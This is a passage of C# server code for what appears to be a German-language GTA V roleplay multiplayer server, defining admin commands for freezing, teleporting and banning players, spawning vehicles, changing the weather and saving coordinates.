                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }
            if (!iPlayer.HasData("mark")) return;

            Vector3 mark = iPlayer.GetData("mark");

            if (Configuration.Instance.DevMode)
                iPlayer.Player.TriggerNewClient("setPlayerGpsMarker", iPlayer.Player.Position.X,
                        iPlayer.Player.Position.Y);

            float distance = iPlayer.Player.Position.DistanceTo(mark);
            iPlayer.SendNewNotification($"Die Distanz beträgt: {distance}!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void freezeplayer(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null) return;

            dbPlayer.Player.Freeze(true, true, true);
            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() + " geFreezed!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            dbPlayer.SendNewNotification("Administrator " + iPlayer.GetName() + " hat Sie geFreezed!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void unfreezeplayer(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null) return;

            dbPlayer.Player.Freeze(false, true, true);
            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() + " entFreezed!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            dbPlayer.SendNewNotification("Administrator " + iPlayer.GetName() + " hat Sie entFreezed!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            dbPlayer.SetCuffed(false);
            dbPlayer.SetMedicCuffed(false);
            dbPlayer.SetTied(false);
            //dbPlayer.Player.FreezePosition = false;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setwhisper(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null) return;

            if (!dbPlayer.HasData("tmpWhisper"))
            {
                dbPlayer.SetData("tmpWhisper", true);
                iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() +
                                        " Whisper Rechte gegeben!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                dbPlayer.SendNewNotification("Administrator " + iPlayer.GetName() +
                                         " hat ihnen Whisper Rechte (/w Name Text) gegeben!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            else
            {
                dbPlayer.ResetData("tmpWhisper");
                iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() +
                                        " Whisper Rechte entzogen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                dbPlayer.SendNewNotification("Administrator " + iPlayer.GetName() +
                                         " hat ihnen Whisper Rechte entzogen!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void w(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod() && !iPlayer.HasData("tmpWhisper"))
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 1) return;

            var dbPlayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (dbPlayer == null) return;

            dbPlayer.SendNewNotification(command[1], title: $"{iPlayer.GetName()} fluestert dir:", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 10000);
            iPlayer.SendNewNotification(command[1], title: $"Sie fluestern: {dbPlayer.GetName()}", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 10000);
            DatabaseLogging.Instance.LogAdminAction(iPlayer.Player, dbPlayer.GetName(), AdminLogTypes.whisper, command[1]);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gethere(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null) return;

            NAPI.Task.Run(() =>
            {
                if (dbPlayer.RageExtension.IsInVehicle)
                {
                    dbPlayer.Player.Vehicle.Position = iPlayer.Player.Position;
                    dbPlayer.Player.Vehicle.Dimension = iPlayer.Player.Dimension;
                    dbPlayer.DimensionType[0] = iPlayer.DimensionType[0];
                }
                else
                {
                    dbPlayer.Player.SetPosition(iPlayer.Player.Position);
                    dbPlayer.SetDimension(player.Dimension);
                    dbPlayer.DimensionType[0] = iPlayer.DimensionType[0];
                }
            });

            // TODO: Find solution for particle effect
            //dbPlayer.Player.CreateParticleEffect("scr_rcbarry1", "scr_alien_teleport", new Vector3(0, 0, 0), new Vector3(0, 0, 0), 1);

            iPlayer.SendNewNotification("Sie haben " + dbPlayer.GetName() +
                                    " zu ihnen teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            dbPlayer.SendNewNotification("Administrator " + iPlayer.GetName() +
                                     " hat sie teleportiert!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gethereveh(Player player, string id)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (!uint.TryParse(id, out uint vehid))
            {
                iPlayer.SendNewNotification("Keine Gültige Fahrzeug ID " + id, NotificationType.ADMIN, "ADMIN");
                return;
            }

            SxVehicle vehicle = VehicleHandler.Instance.GetByVehicleDatabaseId(vehid);

            if (vehicle == null)
            {
                iPlayer.SendNewNotification("Fahrzeug nicht ausgeparkt " + id, NotificationType.ADMIN, "ADMIN");
            }
            else
            {
                vehicle.Entity.Position = player.Position;
                iPlayer.SendNewNotification("Fahrzeug mit der Nummer " + id +
                                    " teleportiert", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void veh(Player player, string commandParams)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                int color1 = 0;
                int color2 = 0;

                if (commandParams == "") return;
                var command = commandParams.Split(" ");

                if (command.Length >= 2) int.TryParse(command[1], out color1);
                if (command.Length == 3) int.TryParse(command[2], out color2);

                var data = uint.TryParse(command[0], out var id)
                    ? VehicleDataModule.Instance.GetDataById(id)
                    : VehicleDataModule.Instance.GetDataByName(command[0]);

                if (data == null) return;
                if (data.Disabled) return;

                NAPI.Task.Run(async () =>
                {
                    try
                    {
                        SxVehicle myveh = VehicleHandler.Instance.CreateServerVehicle(
                            data.Id, true, player.Position,
                            player.Rotation.Z, color1, color2, iPlayer.Player.Dimension, true, false, false, 0, iPlayer.GetName(),
                            0, 999, (uint)iPlayer.Id, 200, 1000, "", "", 0, null, null, true);

                        while (myveh.Entity == null)
                        {
                            await NAPI.Task.WaitForMainThread(100);
                        }

                        player.SetIntoVehicleSave(myveh.Entity, 0);
                    }
                    catch (Exception e)
                    {
                        Logger.DebugLine(e.ToString());
                    }
                });


                DatabaseLogging.Instance.LogAdminAction(player, iPlayer.GetName(), AdminLogTypes.veh, $"{iPlayer.GetName()} hat das Fahrzeug {data.Model} (ID: {data.Id}) gespawnt", 0, Configuration.Instance.DevMode);
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vehtest(Player player, string args)
        {
            //int fahrzeugid
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            if (dbPlayer.RageExtension.IsInVehicle)
            {
                // player is in vehicle and remove
                var sxVeh = player.Vehicle.GetVehicle();

                if (sxVeh == null) return;

                if (sxVeh.IsPlayerVehicle()) sxVeh.SetPrivateCarGarage(1);
                else if (sxVeh.IsTeamVehicle())
                    sxVeh.SetTeamCarGarage(true);
                else
                    VehicleHandler.Instance.DeleteVehicleByEntity(player.Vehicle);
                dbPlayer.SendNewNotification("Fahrzeug respawnt / geloescht", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }

            dbPlayer.Player.TriggerNewClient("freezePlayer", true);
            dbPlayer.Player.SetPosition(new Vector3(-689.973f, 8941.77f, 320.589f));
            dbPlayer.Player.SetRotation(180f);
            dbPlayer.SetDimension(dbPlayer.Id);

            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {

                if (!dbPlayer.CanAccessMethod())
                {
                    dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                if (args == "") return;
                var command = args.Split(" ");

                var data = uint.TryParse(command[0], out var id)
                    ? VehicleDataModule.Instance.GetDataById(id)
                    : VehicleDataModule.Instance.GetDataByName(command[0]);

                if (data == null) return;
                if (data.Disabled) return;

                NAPI.Task.Run(async () =>
                {
                    SxVehicle Sxveh = VehicleHandler.Instance.CreateServerVehicle(
                    data.Id, true, new Vector3(-689.973f, 8941.77f, 320.589f),
                    180f, 0, 0, dbPlayer.Id, true, false, false, 0, dbPlayer.GetName(),
                    0, 999, (uint)dbPlayer.Id, 200, 1000, "", "", 0, null, null, true);
                    while (Sxveh.Entity == null)
                    {
                        await NAPI.Task.WaitForMainThread(100);
                    }
                    Vehicle myveh = Sxveh.Entity;

                    await NAPI.Task.WaitForMainThread(2000);
                    dbPlayer.Player.TriggerNewClient("freezePlayer", false);
                    if (myveh != null) player.SetIntoVehicleSave(myveh, 0);
                });
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public async Task timeban(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length < 2) return;
            int hours;
            bool result = Int32.TryParse(command[1], out hours);
            if (!result)
            {
                iPlayer.SendNewNotification("Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var findplayer = Players.Players.Instance.FindPlayer(command[0], true);
            if (findplayer == null)
            {
                iPlayer.SendNewNotification("Spieler nicht gefunden", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (hours > 99 || hours < 1)
            {
                iPlayer.SendNewNotification("Fehlerhafte Stundenanzahl", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var banstamp = DateTime.Now.AddHours(hours).GetTimestamp();
            iPlayer.SendNewNotification("Sie haben " + findplayer.GetName() + " fuer " + hours +
                                    " Stunden vom Server gebannt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            if (!iPlayer.Rank.CanAccessFeature("hiddenBans"))
            {
                await Chats.SendGlobalMessage("Administrator " + iPlayer.GetName() + " hat " +
                                               findplayer.GetName() + " fuer " + hours +
                                               " Stunden vom Server gebannt! (Grund: " + command[2] + ")", COLOR.RED, ICON.GLOB);
            }

            DatabaseLogging.Instance.LogAdminAction(player, findplayer.GetName(), AdminLogTypes.timeban, command[2], hours, Devmode);
            findplayer.timeban[0] = banstamp;
            findplayer.Save();
            findplayer.Player.SendNotification("Timeban " + hours + " Stunden, Grund: " + command[2]);
            findplayer.Player.Kick("Timeban " + hours + " Stunden, Grund: " + command[2]);
            findplayer.Player.Kick();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void killer(Player player, string name)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);
            if (dbPlayer == null)
            {
                iPlayer.SendNewNotification("Spieler nicht gefunden", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (dbPlayer.IsAlive())
            {
                iPlayer.SendNewNotification("Spieler am Leben", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (!dbPlayer.HasData("killer"))
            {
                iPlayer.SendNewNotification("killer unbekannt", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            NetHandle killer = dbPlayer.GetData("killer");

            if (killer == null)
            {
                iPlayer.SendNewNotification("killer unbekannt (null)", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (killer.GetEntityType() == EntityType.Player)
            {
                Player killerClient = NAPI.Entity.GetEntityFromHandle<Player>(killer);
                iPlayer.SendNewNotification("Killer: " + killerClient.GetPlayer().GetName(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
            else
            {
                iPlayer.SendNewNotification("Killer: " + killer.GetEntityType(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void players(Player player)
        {
            Main.m_AsyncThread.AddToAsyncThread(new Task(() =>
            {
                var iPlayer = player.GetPlayer();

                if (!iPlayer.CanAccessMethod())
                {
                    iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                    return;
                }

                DialogMigrator.CreateMenu(player, Dialogs.menu_player,
                    "Spielerliste (" + Players.Players.Instance.GetValidPlayers().Count + ")", "Alle verbundenen Spieler");
                DialogMigrator.AddMenuItem(player, Dialogs.menu_player, GlobalMessages.General.Close(), "");

                foreach (var user in Players.Players.Instance.GetValidPlayers())
                {
                    if (!user.IsValid()) continue;
                    DialogMigrator.AddMenuItem(player, Dialogs.menu_player, $"{user.GetName()} (VH: {user.VoiceHash})", "");
                }

                DialogMigrator.OpenUserMenu(iPlayer, Dialogs.menu_player);
            }));
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void removeveh(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (iPlayer.RageExtension.IsInVehicle)
            {
                // player is in vehicle and remove
                var pos = player.Position;
                var sxVeh = player.Vehicle.GetVehicle();

                if (sxVeh == null) return;

                if (sxVeh.IsPlayerVehicle()) sxVeh.SetPrivateCarGarage(1);
                else if (sxVeh.IsTeamVehicle())
                    sxVeh.SetTeamCarGarage(true);
                else
                    VehicleHandler.Instance.DeleteVehicleByEntity(player.Vehicle);
                iPlayer.SendNewNotification("Fahrzeug respawnt / geloescht", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                player.SetPosition(pos);
            }
            else
            {
                // player is not in vehicle and remove
                var delVeh = VehicleHandler.Instance.GetClosestVehicle(player.Position);
                if (delVeh == null) return;

                if (delVeh.IsPlayerVehicle()) delVeh.SetPrivateCarGarage(1);
                else if (delVeh.IsTeamVehicle())
                    delVeh.SetTeamCarGarage(true);
                else
                    VehicleHandler.Instance.DeleteVehicleByEntity(delVeh.Entity);
                iPlayer.SendNewNotification("Fahrzeug respawnt / geloescht", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }



        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void vehinfo(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var sxVeh = VehicleHandler.Instance.GetClosestVehicle(player.Position);
            if (sxVeh == null) return;

            var name = (sxVeh.ownerId == 0) ? sxVeh.Team.Name : PlayerNameModule.Instance.Get(sxVeh.ownerId).Name;

            iPlayer.SendNewNotification(
                $"Besitzer: {name} BesitzerID: {sxVeh.ownerId} Fahrer: {(sxVeh.GetOccupants().GetDriver() != null ? sxVeh.GetOccupants().GetDriver().GetName() : "Keiner")} " +
                $"Letzter-Fahrer: {sxVeh.LastDriver} Fraktion: {sxVeh.Team.Name}", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 15000);

            if (iPlayer.RankId < (int)AdminLevelTypes.Staff)
                Players.Players.Instance.SendMessageToAuthorizedUsers("log",
                    iPlayer.GetName() + " sieht sich das Fahrzeug von " + name + " an");

            DatabaseLogging.Instance.LogAdminAction(player, iPlayer.GetName(), AdminLogTypes.log, $"vehinfo {sxVeh.databaseId}");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void names(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (!iPlayer.CanSeeNames)
            {
                iPlayer.SetNames(true);
            }
            else
            {
                iPlayer.SetNames(false);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void afly(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            try
            {
                if (!iPlayer.HasData("adminfly"))
                {
                    iPlayer.SendNewNotification("Sie haben ein Administrator Fahrzeug gespawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.SUCCESS);

                    int color = 64;
                    if (iPlayer.RankId == (int)AdminLevelTypes.Staff) color = 145;
                    else if (iPlayer.RankId == (int)AdminLevelTypes.ThirdLevelTeam)
                        color = 89;
                    else if (iPlayer.RankId == (int)AdminLevelTypes.SecondLevelTeam)
                        color = 64;
                    else if (iPlayer.RankId >= (int)AdminLevelTypes.Management)
                        color = 44;
                    else if (iPlayer.RankId == (int)AdminLevelTypes.FirstLevelTeam)
                        color = 92;

                    if (!Enum.TryParse("2069146067", true, out VehicleHash hash)) return;
                    NAPI.Task.Run(async () =>
                    {
                        var myveh = VehicleHandler.Instance.CreateServerVehicle(
                        VehicleDataModule.Instance.GetData((uint)hash).Id, true,
                        player.Position, player.Rotation.Z, 1, color, iPlayer.Player.Dimension, true, false, false, 0, iPlayer.GetName(), 0,
                        999, iPlayer.Id, 100, 1000, plate: null);

                        while (myveh.Entity == null)
                        {
                            await NAPI.Task.WaitForMainThread(100);
                        }

                        if (myveh != null)
                        {
                            player.SetIntoVehicleSave(myveh.Entity, 0);
                            iPlayer.SetData("adminfly", myveh.Entity);
                        }
                    });
                }
                else
                {
                    Vehicle xveh = iPlayer.GetData("adminfly");
                    if (xveh != null)
                    {
                        VehicleHandler.Instance.DeleteVehicleByEntity(xveh);
                        iPlayer.SendNewNotification("Sie haben ein Administrator Fahrzeug despawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ERROR);
                        iPlayer.ResetData("adminfly");
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gdveh(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            try
            {
                if (!iPlayer.HasData("adminfly"))
                {


                    int color = 89;
                    switch (iPlayer.Rank.Id)
                    {
                        case 13:
                            color = 89;
                            break;
                        case 14:
                            color = 50;
                            break;
                        case 23:
                            color = 50;
                            break;
                        case 26:
                            color = 50;
                            break;
                        default:
                            break;
                    }

                    if (!Enum.TryParse("2069146067", true, out VehicleHash hash)) return;
                    NAPI.Task.Run(async () =>
                    {
                        var myveh = VehicleHandler.Instance.CreateServerVehicle(
                        VehicleDataModule.Instance.GetData((uint)hash).Id, true,
                        player.Position, player.Rotation.Z, 1, color, iPlayer.Player.Dimension, true, false, false, 0, iPlayer.GetName(), 0,
                        999, iPlayer.Id, 100, 1000, plate: null);

                        while (myveh.Entity == null)
                        {
                            await NAPI.Task.WaitForMainThread(100);
                        }

                        if (myveh != null)
                        {
                            player.SetIntoVehicleSave(myveh.Entity, 0);
                            iPlayer.SetData("adminfly", myveh.Entity);
                        }
                    });
                    iPlayer.SendNewNotification("Sie haben ein Administrator Fahrzeug gespawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.SUCCESS);
                }
                else
                {
                    Vehicle xveh = iPlayer.GetData("adminfly");
                    if (xveh != null)
                    {
                        VehicleHandler.Instance.DeleteVehicleByEntity(xveh);
                        iPlayer.SendNewNotification("Sie haben ein Administrator Fahrzeug despawnt!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ERROR);
                        iPlayer.ResetData("adminfly");
                    }
                }
            }
            catch (Exception e)
            {
                Logger.Crash(e);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void weather(Player player, string weatherId)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;
            //TOOD: rage enum
            if (!Enum.TryParse<GTANetworkAPI.Weather>(weatherId, out var weather)) return;
            WeatherModule.Instance.ChangeWeather(weather, overrideWeather: true);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void weathertrans(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();
            if (!dbPlayer.CanAccessMethod()) return;
            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();

            if (command.Length <= 1) return;

            //TOOD: rage enum
            if (!Enum.TryParse<GTANetworkAPI.Weather>(command[0], out var weather)) return;
            if (!float.TryParse(command[1], out float transition)) return;

            WeatherModule.Instance.ChangeWeather(weather, transition, true);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void team(Player player)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            DialogMigrator.CreateMenu(player, Dialogs.menu_player, "GVMP Team", "Teammitglieder");

            DialogMigrator.AddMenuItem(player, Dialogs.menu_player, GlobalMessages.General.Close(), "");
            foreach (DbPlayer dbPlayer in Players.Players.Instance.GetValidPlayers().Where(x => x.Rank.Id != 0).OrderByDescending(x => x.Rank.Salary))
            {
                if (!dbPlayer.IsValid()) continue;
                if (dbPlayer.Rank.Id != 0)
                {
                    DialogMigrator.AddMenuItem(player, Dialogs.menu_player,
                        dbPlayer.Rank.GetDisplayName() + " " +
                        dbPlayer.GetName(), "");
                }
            }

            DialogMigrator.OpenUserMenu(iPlayer, Dialogs.menu_player);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void coord(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 3, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();

            if (command.Length < 2) return;
            float x;
            bool result = float.TryParse(command[0], out x);
            if (!result)
            {
                iPlayer.SendNewNotification("X - Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }
            float y;
            result = float.TryParse(command[1], out y);
            if (!result)
            {
                iPlayer.SendNewNotification("Y - Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            float z;
            result = float.TryParse(command[2], out z);
            if (!result)
            {
                iPlayer.SendNewNotification("Z - Not a number!", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }


            iPlayer.SendNewNotification("Zu Koordinaten X=" + x + " Y=" + y + " Z=" + z, title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            player.SetPosition(new Vector3(x, y, z));
            DatabaseLogging.Instance.LogAdminAction(player, iPlayer.GetName(), AdminLogTypes.coord, $"X: {x}, Y: {y}, Z: {z}", 0, Configuration.Instance.DevMode);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void savecoordsFile(Player player, string comment)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            string x = player.Position.X.ToString().Replace(",", ".");
            string y = player.Position.Y.ToString().Replace(",", ".");
            string z = player.Position.Z.ToString().Replace(",", ".");
            string heading = player.Rotation.Z.ToString().Replace(",", ".");

            File.AppendAllText("savepos.txt",
                string.Format("{0}: new Vector3({1}, {2}, {3}), {4}f \r\n", comment, x, y, z, heading));
            iPlayer.SendNewNotification(string.Format($"Position (x: {x} | y: {y} | z: {z}) saved as: {comment}"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 30000);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void savefrakveh(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            var command = commandParams.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();

            if (command.Length <= 1) return;

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }
            if (!Int32.TryParse(command[0], out int intAutoHausId)) return;
            if (!Int32.TryParse(command[1], out int intDimension)) return;


            string x = player.Position.X.ToString().Replace(",", ".");
            string y = player.Position.Y.ToString().Replace(",", ".");
            string z = player.Position.Z.ToString().Replace(",", ".");
            string heading = player.Heading.ToString().Replace(",", ".");

            MySQLHandler.ExecuteAsync(
                $"INSERT INTO carshop_vehicles (carshopId, model, vehicleHashName, pos_x, pos_y, pos_z, heading, primary_color, secondary_color, dimension) VALUES('{MySqlHelper.EscapeString(command[0])}', '0', '0','{MySqlHelper.EscapeString(x)}', '{MySqlHelper.EscapeString(y)}', '{MySqlHelper.EscapeString(z)}', '{MySqlHelper.EscapeString(heading)}', '131', '131','{MySqlHelper.EscapeString(command[1])}' )");
            iPlayer.SendNewNotification(string.Format("Carshop Position saved as ID: {0}", command[0]), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void savecoords(Player player, string comment)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            string x = player.Position.X.ToString().Replace(",", ".");
            string y = player.Position.Y.ToString().Replace(",", ".");
            string z = player.Position.Z.ToString().Replace(",", ".");
            string heading = player.Rotation.Z.ToString().Replace(",", ".");

            if (iPlayer.RageExtension.IsInVehicle)
            {
                x = player.Vehicle.Position.X.ToString().Replace(",", ".");
                y = player.Vehicle.Position.Y.ToString().Replace(",", ".");
                z = player.Vehicle.Position.Z.ToString().Replace(",", ".");
                heading = player.Vehicle.Rotation.Z.ToString().Replace(",", ".");
            }

            MySQLHandler.ExecuteAsync(
                $"INSERT INTO savedcoords (x, y, z, heading, comment) VALUES('{MySqlHelper.EscapeString(x)}', '{MySqlHelper.EscapeString(y)}', '{MySqlHelper.EscapeString(z)}', '{MySqlHelper.EscapeString(heading)}', '{MySqlHelper.EscapeString(comment)}')");
            iPlayer.SendNewNotification(string.Format($"Position (x: {x} | y: {y} | z: {z}) saved as: {comment}"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 30000);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void getpos(Player player, string comment = "")
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
